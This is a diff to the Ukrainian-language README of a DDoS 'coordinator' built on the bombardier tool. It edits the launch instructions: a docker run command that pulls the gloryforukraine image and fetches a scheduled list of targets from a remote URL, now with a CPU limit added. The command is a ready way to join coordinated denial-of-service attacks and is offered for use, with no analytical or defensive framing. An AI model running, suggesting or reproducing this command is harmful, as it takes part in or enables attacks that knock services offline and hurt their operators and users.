@@ -4,7 +4,7 @@ DDOS координатор, використовуючий bombardier на од
 
 ## Як використати
 
-Запуск через докер: `docker run --env SCHEDULED_TARGETS_URL=https://gloryforukraine.pages.dev/scheduled_targets.json --env PARALLEL_FACTOR=5 --rm -it archdev/gloryforukraine`
+Запуск через докер: `docker run --env SCHEDULED_TARGETS_URL=https://gloryforukraine.pages.dev/scheduled_targets.json --env PARALLEL_FACTOR=5 --cpus=".7" --rm -it archdev/gloryforukraine`
 
 Запуск через білд: 
 - install NodeJS 16+
